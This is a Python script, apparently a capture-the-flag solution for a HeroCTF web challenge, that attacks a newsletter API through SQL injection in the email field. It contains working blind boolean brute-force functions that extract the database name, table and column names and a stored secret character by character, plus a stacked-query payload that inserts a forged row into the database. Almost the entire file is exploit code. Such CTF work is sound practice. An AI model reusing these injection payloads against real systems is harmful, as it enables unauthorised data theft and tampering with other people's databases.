import requests
import random
import string

def tryRawPayload(payload):
    try:
        int = random.randint(0,1000000000)
        email = f"ahahah{int}@blackcat.fr"
        sent_payload = f"{email}{payload}"
        print(sent_payload)
        res = requests.post('https://blackcat.web.heroctf.fr/api/newsletter.php', data={"email": sent_payload}, timeout=15)
        print(res.text)
        return "error" not in res.text
    except:
        return False

def tryPayload(payload):
    return tryRawPayload(f"{email}',({payload}));--")

def brute(exfiltrated):
    for char in string.printable:
        if char != "%":
            if char == "_": char = "\_"
            guess = exfiltrated + char
            if tryPayload(f"select 1 from dual where database() like '{guess}%'"):
                print(guess)
                brute(guess)

def brutePerChar(exfiltrated):
    for char in string.printable:
        if char != "%":
            guess = exfiltrated + char
            if tryPayload(f"SELECT 1 FROM dual where (SELECT ascii(substring((select secret from blackcat.newsletter limit 0,1),{len(exfiltrated)+1},1))={ord(char)}) != 0"):
                print(guess)
                brutePerChar(guess)

#brute('')
#brutePerChar('')
email = f"ahahah{random.randint(0,1000000000)}"
date = "2023/05/21"
tryRawPayload(f"','okok');INSERT INTO newsletter (email,secret,send_date) VALUES('{email}', 'secret', '{date}');--")

url = f"https://blackcat.web.heroctf.fr/api/check.php?email={email}&secret=secret"
res = requests.get(url)
print(res.text)
exit(1)
#select 1 from dual where database() like '{guess}%'  donne blackcat
#SELECT 1 FROM dual where (SELECT ascii(substring((SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),{len(exfiltrated)+1},1))={ord(char)}) != 0 : donne newsletter
#SELECT 1 FROM dual where (SELECT ascii(substring((select column_name from information_schema.columns where table_name='newsletter' limit 0,1),{len(exfiltrated)+1},1))={ord(char)}) != 0 : donne email, secret, send_date,   
